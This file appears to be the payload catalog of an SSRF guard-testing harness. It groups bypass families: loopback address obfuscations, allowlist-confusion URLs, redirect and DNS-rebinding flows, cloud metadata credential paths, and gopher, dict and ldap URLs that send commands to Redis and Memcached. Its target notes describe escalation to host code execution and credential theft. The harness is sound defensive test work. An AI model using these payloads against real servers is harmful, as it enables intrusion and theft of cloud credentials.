"""Bypass payload catalog.

Each entry is a *family* of concrete values that express the same idea, for
example "write the loopback address in a notation the guard did not
anticipate". One row of the result matrix is one family against one lab
variant, and a cell counts as a bypass only when a probe reached an internal
target -- proven by the target's canary marker in the body, or by a row in the
target's access log for blind variants. Getting past the guard and landing on
the allowlisted public host is not a bypass, and ``expect`` is what keeps those
two outcomes apart.

``defeats`` records which guards the family is *expected* to defeat. It is a
declaration, never evidence: the harness measures what actually happened and
the evaluator prints declared against measured, because a mismatch means either
the lab or this file is wrong and both are worth knowing about.

Resolution and parsing behaviour below was measured rather than assumed; see
docs/EVAL-PROTOCOL.md for the transcripts.

-------------------------------------------------------------------------
Where to add a payload
-------------------------------------------------------------------------
"Did you include every variant?" has no yes, and pretending otherwise is worse
than admitting it: there is no finite list of ways to write an address or wrap
an authority. What a catalog can do is be a cross product of named axes, so
that coverage is a number a reader can check instead of a claim. There are
four axes here, and every payload belongs to exactly one of them:

  1. SPELLING   -- the same internal address, written differently.
                   Add a string to the relevant family's value list below.
                   Helper: ``loopback("<authority>")``.
  2. TARGET     -- a different internal service to reach.
                   Add a ``Target`` to ``TARGETS`` and it appears in the
                   service-range family automatically.
  3. WRAPPER    -- the allowlisted name present in the URL without being the
                   authority: userinfo, suffix, query, fragment, delimiter
                   tricks. Helper: ``wrapped("<authority form>")``.
  4. SCHEME     -- a handler other than http. Add to the scheme families;
                   note that which sink is in front decides whether the scheme
                   is reachable at all, so a negative there is a fact about the
                   sink and the family note must say so.

A payload copied from a public collection goes into the axis it belongs to,
as one line. If it does not fit an axis, that is the signal to add an axis
rather than to append it somewhere convenient.

A family may declare ``discloses=False``: the request is expected to reach the
service while the service is expected not to hand over its secret. Header-gated
cloud metadata is the real case. Those cells are scored ``reached_not_disclosed``
and are deliberately not counted as bypasses, because "the cloud's own
mitigation held" and "the application's guard held" are different findings.
"""
from __future__ import annotations

from dataclasses import dataclass

from ssrefuse import testbed_spec as spec

ADMIN = f"{spec.PORT_INTERNAL_ADMIN}/admin"
METADATA_PATH = "latest/meta-data/iam/security-credentials/"


@dataclass(frozen=True)
class Family:
    id: str
    title: str
    url_values: tuple[tuple[str, str], ...] = ()      # (url, expected marker key)
    host_values: tuple[tuple[str, str], ...] = ()     # (authority, expected marker key)
    path_values: tuple[tuple[str, str], ...] = ()     # (path suffix, expected marker key)
    defeats: tuple[str, ...] = ()
    axis: str = "spelling"     # spelling | target | wrapper | scheme | flow | control
    note: str = ""
    instrument: bool = False   # evidence about reachability, not a bypass in itself
    discloses: bool = True     # False: reaching the service is expected, the secret is not


# Marker keys map to the canaries a successful probe must show.
EXPECT_MARKERS = {
    "internal": spec.MARKER_INTERNAL,
    "metadata": spec.MARKER_METADATA,
    "metadata_ecs": spec.MARKER_METADATA_ECS,
    "metadata_alibaba": spec.MARKER_METADATA_ALIBABA,
    "metadata_guarded": spec.MARKER_METADATA_GUARDED,
    "cgnat": spec.MARKER_CGNAT,
    "rfc1918": spec.MARKER_RFC1918,
    "docker": spec.MARKER_DOCKER,
    "elastic": spec.MARKER_ELASTIC,
    "consul": spec.MARKER_CONSUL,
    "actuator": spec.MARKER_ACTUATOR,
    "redis": spec.MARKER_REDIS,
    "memcached": spec.MARKER_MEMCACHED,
    "localfile": spec.MARKER_LOCALFILE,
    "benign": spec.MARKER_BENIGN,
    "oob": spec.MARKER_OOB,
}


# --- axis 2: the internal services worth reaching --------------------------
# Modelled on what an SSRF is pointed at in production rather than on a
# training range: an unauthenticated container API, a search cluster, a
# service-discovery store, a framework's diagnostics endpoint, another host on
# the corporate network, and two services that do not speak HTTP. Add a row and
# every target-axis family picks it up.

@dataclass(frozen=True)
class Target:
    """One internal service, and what reaching it is worth.

    ``chain`` is the reason the target is in the list. SSRF is almost never
    the end of a report: on its own it is "the server fetched a URL", and the
    severity comes from the next hop. Recording that next hop next to the
    target keeps the matrix from being read as a reachability exercise, and it
    is what stops a row of green cells against a search cluster being filed
    beside a row of green cells against a container runtime.

    The hop itself is NOT exercised by this harness. Reaching a service is
    measured; what the service would then do is a statement about the
    software it imitates, and it is written here as such.
    """
    key: str            # an EXPECT_MARKERS key
    title: str
    authority: str      # host[:port] as it is written in a URL
    path: str = "/"
    chain: str = ""     # what an attacker does next, not measured here
    note: str = ""


TARGETS: tuple[Target, ...] = (
    Target("internal", "internal admin service",
           f"{spec.IP_INTERNAL}:{spec.PORT_INTERNAL_ADMIN}", "/admin",
           chain="read an endpoint the network was the only thing protecting"),
    Target("docker", "Docker Engine API, unauthenticated by default",
           f"{spec.IP_INTERNAL}:{spec.PORT_DOCKER}", "/version",
           chain="create a container with the host filesystem mounted: "
                 "code execution on the host",
           note="the single highest-value target on a container host"),
    Target("elastic", "Elasticsearch",
           f"{spec.IP_INTERNAL}:{spec.PORT_ELASTIC}", "/_search?q=*",
           chain="read every index; a GET is enough, so a read-only SSRF suffices"),
    Target("consul", "Consul KV",
           f"{spec.IP_INTERNAL}:{spec.PORT_CONSUL}", "/v1/kv/?recurse",
           chain="read service credentials out of the KV store; with a write "
                 "primitive, register a service and get execution"),
    Target("actuator", "Spring Boot actuator",
           f"{spec.IP_INTERNAL}:{spec.PORT_ACTUATOR}", "/actuator/env",
           chain="read the whole environment, which is where the database "
                 "password and the cloud keys are"),
    Target("rfc1918", "another host on the corporate network",
           f"{spec.IP_RFC1918}", "/",
           chain="pivot: the application becomes a proxy into a network "
                 "segment the attacker has no route to"),
    Target("redis", "Redis, reached over HTTP on its own port",
           f"{spec.IP_INTERNAL}:{spec.PORT_REDIS}", "/",
           chain="with a write primitive (gopher), set a key whose value is a "
                 "cron entry or an authorized_keys line: code execution",
           note="not an HTTP server; the request line still arrives and is logged"),
    Target("memcached", "Memcached, reached over HTTP on its own port",
           f"{spec.IP_INTERNAL}:{spec.PORT_MEMCACHED}", "/",
           chain="overwrite cached objects; where the cache holds serialised "
                 "objects this is deserialisation on the next read"),
)


def loopback(authority: str, path: str = ADMIN) -> tuple[str, str]:
    """An internal-admin URL whose authority is written as given.

    ``path`` carries the port as well, because every spelling of the loopback
    address has to reach the same service on the same port for the family to
    be about the spelling and nothing else.
    """
    return (f"http://{authority}:{path}", "internal")


def wrapped(authority: str, path: str = ADMIN) -> tuple[str, str]:
    """A URL whose authority contains the allowlisted name without being it."""
    return (f"http://{authority}:{path}", "internal")


def target_url(target: Target) -> tuple[str, str]:
    return (f"http://{target.authority}{target.path}", target.key)


def same_host_targets() -> tuple[Target, ...]:
    """Services behind the loopback address, other than the admin endpoint.

    The service-range family has to vary the *port* and hold the address
    fixed, or a cell could be green because a different host answered and the
    row would stop being about ports at all. Targets on other addresses have
    their own families.
    """
    return tuple(t for t in TARGETS
                 if t.key != "internal" and t.authority.startswith(spec.IP_INTERNAL))


FAMILIES: tuple[Family, ...] = (
    # ---- the mandatory control -------------------------------------------
    Family(
        id="B00_benign_allowed",
        title="benign request to the allowlisted partner host",
        axis="control",
        url_values=((f"http://{spec.ALLOWED_HOST}/", "benign"),),
        host_values=((spec.ALLOWED_HOST, "benign"),),
        defeats=(),
        note="Positive control for the harness, not an attack. This must succeed "
             "against every variant whose guard permits the partner host. If it "
             "fails everywhere, the prober is broken and no negative result in "
             "the run can be read as a guard holding.",
    ),

    # ---- axis 1: spellings of an internal address ------------------------
    Family(
        id="B01_plain_loopback",
        title="loopback address written the obvious way",
        axis="spelling",
        url_values=(loopback(spec.IP_INTERNAL),),
        host_values=((f"{spec.IP_INTERNAL}:{spec.PORT_INTERNAL_ADMIN}", "internal"),),
        defeats=("G0_none", "G9_scheme_only"),
    ),
    Family(
        id="B02_loopback_alias",
        title="shorthand, padded and neighbouring forms of loopback",
        axis="spelling",
        url_values=tuple(loopback(value) for value in (
            "127.1",
            "127.0.1",
            "127.000.000.001",
            "0",
            "0x0",
            "0.0.0.0",
            "127.0.0.2",
            "127.255.255.254",
            "127.127.127.127",
            "127.0.1.3",
            "localhost",
            "LOCALHOST",
            "localhost.localdomain",
            # Names that /etc/hosts maps to ::1 on a Debian-family system. They
            # are not DNS and no resolver policy touches them, which is why a
            # guard that reasons about names misses them.
            "ip6-localhost",
            "ip6-loopback",
        )),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
        note="0.0.0.0 and the bare 0 reach a service bound to loopback on Linux; "
             "127.0.0.2 is inside 127/8 but is not the string anyone denylists, "
             "and nothing is listening on it, so its cell shows what a connect "
             "failure looks like next to a guard that held.",
    ),
    Family(
        id="B03_decimal_ip",
        title="loopback as a 32-bit decimal integer",
        axis="spelling",
        url_values=tuple(loopback(value) for value in ("2130706433", "0d2130706433")),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
    ),
    Family(
        id="B04_octal_ip",
        title="loopback with octal octets",
        axis="spelling",
        url_values=tuple(loopback(value) for value in (
            "0177.0.0.1", "0177.1", "017700000001", "0177.0.0.01",
            # Prefixes that only some parsers accept as octal. They are here
            # because the interesting answer is which ones a given runtime
            # takes, and that is a measurement rather than a guess.
            "o177.0.0.1", "0o177.0.0.1", "q177.0.0.1",
        )),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
    ),
    Family(
        id="B05_hex_ip",
        title="loopback in hexadecimal",
        axis="spelling",
        url_values=tuple(loopback(value) for value in (
            "0x7f000001", "0x7f.0.0.1", "0x7f.1", "0X7F000001",
        )),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
    ),
    Family(
        id="B06_ipv6_loopback",
        title="IPv6 loopback, mapped and expanded forms",
        axis="spelling",
        url_values=tuple(loopback(value) for value in (
            "[::1]",
            "[::ffff:127.0.0.1]",
            "[::ffff:7f00:1]",
            "[0:0:0:0:0:0:0:1]",
            "[0:0:0:0:0:ffff:127.0.0.1]",
            "[::]",
        )),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
        note="Measured: the WHATWG parser keeps the brackets on the hostname it "
             "returns, so a denylist entry written as ::1 never matches one.",
    ),
    Family(
        id="B07_dns_to_internal",
        title="attacker-controlled name resolving to an internal address",
        axis="spelling",
        url_values=(
            (f"http://internal.{spec.ZONE}:{ADMIN}", "internal"),
            (f"http://anything.internal.{spec.ZONE}:{ADMIN}", "internal"),
        ),
        host_values=((f"internal.{spec.ZONE}:{spec.PORT_INTERNAL_ADMIN}", "internal"),),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
        note="No address appears in the URL at all, so every guard that reasons "
             "about the URL as text is blind to it.",
    ),
    Family(
        id="B08_trailing_dot",
        title="fully qualified name with a trailing dot",
        axis="spelling",
        url_values=(
            (f"http://internal.{spec.ZONE}.:{ADMIN}", "internal"),
            (f"http://localhost.:{ADMIN}", "internal"),
            (f"http://127.0.0.1.:{ADMIN}", "internal"),
        ),
        defeats=("G2_denylist_host",),
        note="The root-anchored form is a different string but the same host. "
             "The numeric form is listed so the run states whether glibc "
             "resolves it here rather than leaving it to memory; the WHATWG "
             "parser strips the dot from a numeric authority and keeps it on a "
             "name, so the two forms do not behave alike.",
    ),
    Family(
        id="B27_unicode_authority",
        title="authority written with characters that normalise to ASCII",
        axis="spelling",
        url_values=tuple(loopback(value) for value in (
            "127。0。0。1",          # ideographic full stops
            "１２７.0.0.1",          # fullwidth digits
            "127.0.0.1。",           # trailing ideographic full stop
            # Circled letters. UTS-46 maps them onto ASCII, so this is the
            # string "localhost" to a resolver and nothing a denylist wrote
            # down to a string comparison.
            "ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",
        )),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
        note="Measured: Python's resolver IDNA-encodes the host, and UTS-46 maps "
             "the ideographic full stop and fullwidth digits onto ASCII, so the "
             "name resolves to loopback while urlparse still returns the "
             "original characters for a denylist to compare. The WHATWG parser "
             "normalises them before the comparison instead, so this family is "
             "expected to separate the two runtimes.",
    ),

    # ---- axis 3: the allowlisted name present without being the authority --
    Family(
        id="B09_userinfo_confusion",
        title="allowlisted name demoted to a userinfo field",
        axis="wrapper",
        url_values=tuple(wrapped(value) for value in (
            f"{spec.ALLOWED_HOST}@127.0.0.1",
            f"{spec.ALLOWED_HOST}:password@127.0.0.1",
            f"{spec.ALLOWED_HOST}@@127.0.0.1",
            f"{spec.ALLOWED_HOST}%09@127.0.0.1",
            f"{spec.ALLOWED_HOST}%20@127.0.0.1",
            # A backslash where a parser expects a separator. Which side of it
            # each parser calls the authority is the whole technique.
            spec.ALLOWED_HOST + r":80\@127.0.0.1",
            spec.ALLOWED_HOST + r":80:\@@127.0.0.1",
            spec.ALLOWED_HOST + r"#\@127.0.0.1",
        )),
        path_values=((f"@127.0.0.1:{ADMIN}", "internal"),),
        defeats=("G3_allowlist_prefix", "G4_allowlist_substring", "G10_regex_unanchored"),
        note="Starts with the allowlisted origin and still connects to loopback. "
             "In the path-injection form the same trick ends the hostname early "
             "and turns the fixed host into a userinfo field. Measured: Node's "
             "fetch refuses any URL carrying credentials before sending it, so "
             "against that sink the cell is a sink error and not a block.",
    ),
    Family(
        id="B10_subdomain_suffix",
        title="allowlisted name extended into a longer, attacker-owned name",
        axis="wrapper",
        url_values=(
            (f"http://{spec.ALLOWED_HOST}.internal.{spec.ZONE}:{ADMIN}", "internal"),
            (f"http://{spec.ALLOWED_HOST}.evil.{spec.ZONE}.internal.{spec.ZONE}:{ADMIN}",
             "internal"),
        ),
        host_values=((f"{spec.ALLOWED_HOST}.internal.{spec.ZONE}:{spec.PORT_INTERNAL_ADMIN}",
                      "internal"),),
        defeats=("G3_allowlist_prefix", "G4_allowlist_substring", "G10_regex_unanchored"),
    ),
    Family(
        id="B11_query_confusion",
        title="allowlisted name carried in the query of someone else's URL",
        axis="wrapper",
        url_values=(
            (f"http://127.0.0.1:{ADMIN}?ref={spec.ALLOWED_HOST}", "internal"),
            (f"http://127.0.0.1:{ADMIN}?next=http://{spec.ALLOWED_HOST}/", "internal"),
        ),
        defeats=("G4_allowlist_substring",),
    ),
    Family(
        id="B12_fragment_confusion",
        title="allowlisted name hidden in a fragment",
        axis="wrapper",
        url_values=(
            (f"http://127.0.0.1:{ADMIN}#{spec.ALLOWED_HOST}", "internal"),
            (f"http://127.0.0.1:{ADMIN}#@{spec.ALLOWED_HOST}", "internal"),
        ),
        defeats=("G4_allowlist_substring",),
        note="The fragment is never sent on the wire but a substring check sees it.",
    ),
    Family(
        id="B28_slash_confusion",
        title="scheme and separator written in a form parsers disagree about",
        axis="wrapper",
        url_values=(
            (f"HTTP://127.0.0.1:{ADMIN}", "internal"),
            (f"hTtP://127.0.0.1:{ADMIN}", "internal"),
            (f"http:/\\127.0.0.1:{ADMIN}", "internal"),
            (f"http:\\\\127.0.0.1:{ADMIN}", "internal"),
            (f"//127.0.0.1:{ADMIN}", "internal"),
            (f"http:///127.0.0.1:{ADMIN}", "internal"),
            (f"http:127.0.0.1:{ADMIN}", "internal"),
        ),
        defeats=("G3_allowlist_prefix", "G9_scheme_only", "G10_regex_unanchored"),
        note="Measured: urlparse returns no hostname for the backslash forms "
             "while the WHATWG parser resolves them to loopback, and a "
             "scheme-relative value has no scheme for a scheme check to read.",
    ),
    Family(
        id="B29_double_encoding",
        title="authority that only becomes an address after decoding twice",
        axis="wrapper",
        url_values=(
            (f"http://%2531%2532%2537%252e0%252e0%252e1:{ADMIN}", "internal"),
            (f"http://{spec.ALLOWED_HOST}%2540127.0.0.1:{ADMIN}", "internal"),
        ),
        defeats=("G1_denylist_substring", "G11_guard_wrong_value"),
        note="Included because its failure is informative: a client that decodes "
             "once cannot reach the address, so a negative cell here says the "
             "guard was not what stopped the request.",
    ),
    Family(
        id="B26_crlf_in_url",
        title="carriage return and line feed inside the URL",
        axis="wrapper",
        url_values=(
            (f"http://127.0.0.1:{ADMIN}%0d%0aX-Injected:%20ssrefuse", "internal"),
            (f"http://127.0.0.1:{spec.PORT_REDIS}/%0d%0aPING%0d%0a", "redis"),
            (f"http://127.0.0.1%0d%0a:{ADMIN}", "internal"),
        ),
        defeats=("G0_none",),
        note="The second value is the production shape of this technique: an "
             "HTTP request aimed at a port that speaks a line protocol, so that "
             "the request line itself becomes a command. Whether the client "
             "forwards the encoded CRLF at all is the thing being measured.",
    ),

    Family(
        id="B31_path_encoding",
        title="the path, not the authority, written in an encoded form",
        axis="wrapper",
        url_values=(
            (f"http://127.0.0.1:{spec.PORT_INTERNAL_ADMIN}/%61dmin", "internal"),
            (f"http://127.0.0.1:{spec.PORT_INTERNAL_ADMIN}/%2561dmin", "internal"),
            (f"http://127.0.0.1:{spec.PORT_INTERNAL_ADMIN}/./admin", "internal"),
            (f"http://127.0.0.1:{spec.PORT_INTERNAL_ADMIN}/x/../admin", "internal"),
        ),
        defeats=("G1_denylist_substring",),
        note="Every other family in this catalog varies the authority. This one "
             "holds the authority in plain sight and varies the path, which is "
             "what defeats a guard written against a path rather than a host -- "
             "and the double-encoded value is there so the run states whether "
             "the client decodes once or twice.",
    ),
    Family(
        id="B32_parser_disagreement",
        title="one URL that three parsers read as three different hosts",
        axis="wrapper",
        url_values=(
            (f"http://{spec.ALLOWED_HOST}%20&@127.0.0.1:{ADMIN}#@{spec.IP_PUBLIC}/", "internal"),
            (f"http://{spec.ALLOWED_HOST}@127.0.0.1:{spec.PORT_INTERNAL_ADMIN}"
             f"@{spec.ALLOWED_HOST}/admin", "internal"),
        ),
        defeats=("G6_allowlist_host_noredirect", "G11_guard_wrong_value"),
        note="The sharpest shape of the whole class: the guard and the client do "
             "not disagree about a rule, they disagree about which substring is "
             "the host. A guard is only as good as the parser under it, and this "
             "family exists to put a number on that.",
    ),
    Family(
        id="B33_ldap_scheme",
        title="ldap scheme used to deliver a line protocol",
        axis="scheme",
        url_values=(
            (f"ldap://127.0.0.1:{spec.PORT_MEMCACHED}/%0astats%0aquit", "memcached"),
            (f"ldap://127.0.0.1:{spec.PORT_REDIS}/%0aPING%0a", "redis"),
        ),
        defeats=("G0_none",),
        note="Same idea as gopher and dict and a different handler again, which "
             "is the point: the set of schemes a sink speaks is a property of "
             "the sink, and three families measure it instead of one assuming it.",
    ),

    # ---- axis 2: other internal targets -----------------------------------
    Family(
        id="B24_internal_service_range",
        title="other services behind the same loopback address, by port",
        axis="target",
        url_values=tuple(target_url(t) for t in same_host_targets()),
        host_values=tuple((t.authority, t.key) for t in same_host_targets()),
        defeats=("G0_none", "G9_scheme_only", "G1_denylist_substring", "G2_denylist_host"),
        note="A denylist written for the loopback address says nothing about "
             "which port behind it answers. This family is the reason the "
             "testbed runs a service range rather than one admin endpoint: the "
             "Docker API alone turns a read primitive into code execution, and "
             "no guard in this corpus distinguishes port 2375 from port 19001.",
    ),
    Family(
        id="B25_rfc1918_host",
        title="another host on the private network, by address and by name",
        axis="target",
        url_values=(
            (f"http://{spec.IP_RFC1918}/", "rfc1918"),
            (f"http://intranet.{spec.ZONE}/", "rfc1918"),
        ),
        host_values=((spec.IP_RFC1918, "rfc1918"),),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
        note="Loopback is the example everyone guards. The rest of RFC 1918 is "
             "where the interesting hosts are, and a denylist of loopback "
             "spellings does not mention any of it.",
    ),
    Family(
        id="B15_metadata_service",
        title="cloud metadata addresses that answer without a header",
        axis="target",
        url_values=(
            (f"http://{spec.IP_METADATA}/{METADATA_PATH}", "metadata"),
            (f"http://metadata.{spec.ZONE}/{METADATA_PATH}", "metadata"),
            (f"http://{spec.IP_METADATA_ECS}/v2/metadata", "metadata_ecs"),
            (f"http://{spec.IP_METADATA_ALIBABA}/latest/meta-data/", "metadata_alibaba"),
        ),
        defeats=("G0_none", "G9_scheme_only", "G2_denylist_host"),
        note="IMDSv1, ECS task metadata and Alibaba's endpoint all answer a "
             "plain GET. A denylist that knows 169.254.169.254 does not know "
             "169.254.170.2 or 100.100.100.200.",
    ),
    Family(
        id="B30_metadata_header_gated",
        title="cloud metadata that requires a request header",
        axis="target",
        discloses=False,
        url_values=(
            (f"http://{spec.IP_METADATA}/computeMetadata/v1/instance/service-accounts/"
             "default/token", "metadata_guarded"),
            (f"http://{spec.IP_METADATA}/metadata/instance?api-version=2021-02-01",
             "metadata_guarded"),
            (f"http://{spec.IP_METADATA}/latest/api/token", "metadata_guarded"),
        ),
        defeats=(),
        note="GCP wants Metadata-Flavor: Google, Azure wants Metadata: true, and "
             "IMDSv2 wants a token fetched with a PUT. An SSRF that controls the "
             "URL and nothing else produces none of them. This family is "
             "expected to reach the service and come back empty-handed, which "
             "is a different outcome from being blocked by the application and "
             "is scored as its own verdict. It is in the catalog so that the "
             "difference between 'the application stopped it' and 'the cloud "
             "stopped it' is measured rather than assumed.",
    ),
    Family(
        id="B16_cgnat_range",
        title="RFC 6598 shared address space",
        axis="target",
        url_values=(
            (f"http://{spec.IP_CGNAT}/", "cgnat"),
            (f"http://cgnat.{spec.ZONE}/", "cgnat"),
        ),
        defeats=("G1_denylist_substring", "G2_denylist_host"),
        note="100.64.0.0/10 is neither private nor global, so guards written as "
             "'reject RFC 1918 and loopback' let it through.",
    ),

    # ---- axis 4: schemes other than http ----------------------------------
    Family(
        id="B17_file_scheme",
        title="file scheme on a sink that accepts arbitrary handlers",
        axis="scheme",
        url_values=(
            (f"file://{spec.SECRET_FILE}", "localfile"),
            (f"file:///{spec.SECRET_FILE.lstrip('/')}", "localfile"),
        ),
        defeats=("G0_none",),
        note="Applies to urllib-style sinks and to curl; the requests library, "
             "Node's fetch and Node's http.get have no file handler, so a "
             "negative there is about the sink, not the guard.",
    ),
    Family(
        id="B22_gopher_scheme",
        title="gopher scheme carrying a line protocol to a non-HTTP service",
        axis="scheme",
        url_values=(
            (f"gopher://127.0.0.1:{spec.PORT_REDIS}/_PING%0d%0a", "redis"),
            (f"gopher://127.0.0.1:{spec.PORT_REDIS}/_%2A1%0d%0a%244%0d%0aPING%0d%0a", "redis"),
            (f"gopher://127.0.0.1:{spec.PORT_MEMCACHED}/_stats%0d%0a", "memcached"),
        ),
        defeats=("G0_none",),
        note="The technique that turns SSRF into arbitrary writes against Redis "
             "in production. It needs a client that speaks gopher, which in this "
             "corpus means the curl subprocess and nothing else -- so this "
             "family measures the sink's protocol surface, and a negative cell "
             "on a library sink is a fact about the library.",
    ),
    Family(
        id="B23_dict_scheme",
        title="dict scheme used to talk to a line protocol",
        axis="scheme",
        url_values=(
            (f"dict://127.0.0.1:{spec.PORT_REDIS}/info", "redis"),
            (f"dict://127.0.0.1:{spec.PORT_MEMCACHED}/stats", "memcached"),
        ),
        defeats=("G0_none",),
        note="Same idea as gopher with a different handler, kept apart because a "
             "client can support one and not the other.",
    ),

    # ---- guards that parse the URL correctly ------------------------------
    Family(
        id="B13_redirect",
        title="allowlisted host redirects the fetch to an internal target",
        axis="flow",
        url_values=(
            (f"http://{spec.ALLOWED_HOST}/redirect?to=http://127.0.0.1:{ADMIN}", "internal"),
            (f"http://{spec.ALLOWED_HOST}/chain?to=http://127.0.0.1:{ADMIN}&n=3", "internal"),
            (f"http://{spec.ALLOWED_HOST}/redirect?to=http://{spec.IP_INTERNAL}:"
             f"{spec.PORT_DOCKER}/version", "docker"),
            # 307 and 308 preserve the method and the body, which is what makes
            # a redirect useful against a target that only acts on POST.
            (f"http://{spec.ALLOWED_HOST}/redirect307?to=http://127.0.0.1:{ADMIN}",
             "internal"),
        ),
        defeats=("G5_allowlist_host_redirects",),
        note="The guard is a statement about the first request only.",
    ),
    Family(
        id="B14_dns_rebinding",
        title="name that answers public on the check and internal on the fetch",
        axis="flow",
        url_values=((f"http://rebind.{spec.ZONE}:{ADMIN}", "internal"),),
        defeats=("G7_resolve_check_public",),
        note="Two lookups, TTL 0, alternating answers: the validated address and "
             "the connected address are never the same one.",
    ),

    # ---- blind-only oracle ------------------------------------------------
    Family(
        id="B18_oob_callback",
        title="out-of-band callback for variants that return nothing",
        axis="flow",
        url_values=((f"http://probe.oob.{spec.ZONE}/beacon", "oob"),),
        host_values=((f"probe.oob.{spec.ZONE}", "oob"),),
        defeats=(),
        instrument=True,
        note="Evidence is the DNS query and the HTTP hit recorded by the canary, "
             "which is the only oracle available when the body is discarded. "
             "This family is an instrument, not an attack: the canary sits on a "
             "globally classified address, so reaching it shows that a fetch "
             "happened and says nothing about internal access. A guard that only "
             "permits public addresses reaches it legitimately, which is why it "
             "is excluded from the bypass matrix and reported on its own.",
    ),

    # ---- normalisation applied to a copy ---------------------------------
    Family(
        id="B19_encoded_host",
        title="percent-encoded authority",
        axis="wrapper",
        url_values=(
            (f"http://%31%32%37%2e%30%2e%30%2e%31:{ADMIN}", "internal"),
            (f"http://127%2e0%2e0%2e1:{ADMIN}", "internal"),
        ),
        defeats=("G1_denylist_substring",),
        note="Measured: the WHATWG parser decodes this before a denylist sees "
             "it, Python's urlparse does not, so the same guard behaves "
             "differently in the two runtimes.",
    ),
    Family(
        id="B21_decoded_delimiter",
        title="percent-encoded delimiter that only appears after decoding",
        axis="wrapper",
        url_values=(
            (f"http://{spec.ALLOWED_HOST}%2f@127.0.0.1:{ADMIN}", "internal"),
            (f"http://{spec.ALLOWED_HOST}%3f@127.0.0.1:{ADMIN}", "internal"),
            (f"http://{spec.ALLOWED_HOST}%23@127.0.0.1:{ADMIN}", "internal"),
        ),
        defeats=("G11_guard_wrong_value",),
        note="Measured: urlparse reads the authority of the raw value as "
             "127.0.0.1, and the authority of the decoded value as the "
             "allowlisted host. An application that validates a decoded copy and "
             "fetches the original sees two different URLs.",
    ),

    # ---- breaking out of a path-only injection point ---------------------
    Family(
        id="B20_authority_breakout",
        title="escaping a fixed authority from the path",
        axis="wrapper",
        url_values=(),
        path_values=(
            (f"//127.0.0.1:{ADMIN}", "internal"),
            (f"/..//@127.0.0.1:{ADMIN}", "internal"),
            (f"\\\\127.0.0.1:{ADMIN}", "internal"),
            (f"/\\127.0.0.1:{ADMIN}", "internal"),
            (f"@127.0.0.1:{spec.PORT_DOCKER}/version", "docker"),
        ),
        defeats=("G12_path_concat_unvalidated",),
        note="Only meaningful where the app builds the URL as host + path. A "
             "scheme-relative value replaces the authority outright.",
    ),
)

FAMILY_BY_ID = {f.id: f for f in FAMILIES}
CONTROL_FAMILY = "B00_benign_allowed"
INSTRUMENT_FAMILIES = {f.id for f in FAMILIES if f.instrument}
ATTACK_FAMILIES = [f.id for f in FAMILIES
                   if not f.instrument and f.id != CONTROL_FAMILY]
AXES = ("spelling", "target", "wrapper", "scheme", "flow", "control")


@dataclass(frozen=True)
class Payload:
    family: str
    value: str
    kind: str
    expect: str
    expected_marker: str
    discloses: bool = True


def payloads_for_kind(kind: str) -> list[Payload]:
    """Render every family for one injection shape.

    A family with no value for this shape is skipped here and reported as
    not-applicable by the prober, which counts those separately so a skipped
    row can never be read as a guard that held.
    """
    out: list[Payload] = []
    for fam in FAMILIES:
        values = {"url": fam.url_values, "host": fam.host_values,
                  "path": fam.path_values}.get(kind, ())
        for value, expect in values:
            out.append(Payload(fam.id, value, kind, expect, EXPECT_MARKERS[expect],
                               fam.discloses))
    return out


def applicable_families(kind: str) -> list[str]:
    return [f.id for f in FAMILIES
            if {"url": f.url_values, "host": f.host_values,
                 "path": f.path_values}.get(kind, ())]


def axis_coverage() -> dict[str, dict[str, int]]:
    """Families and concrete values per axis.

    Printed in the report because "did the catalog cover everything" has no
    answer, while "how many spellings, targets, wrappers and schemes were
    tried" has one that a reader can check.
    """
    out: dict[str, dict[str, int]] = {}
    for axis in AXES:
        families = [f for f in FAMILIES if f.axis == axis]
        out[axis] = {
            "families": len(families),
            "values": sum(len(f.url_values) + len(f.host_values) + len(f.path_values)
                          for f in families),
        }
    return out


def summary() -> str:
    lines = [f"{len(FAMILIES)} families, {len(TARGETS)} internal targets"]
    for kind in ("url", "host", "path"):
        payloads = payloads_for_kind(kind)
        lines.append(f"  kind={kind:5} families={len(applicable_families(kind)):2} "
                     f"concrete_values={len(payloads)}")
    for axis, counts in axis_coverage().items():
        lines.append(f"  axis={axis:9} families={counts['families']:2} "
                     f"values={counts['values']:3}")
    return "\n".join(lines)
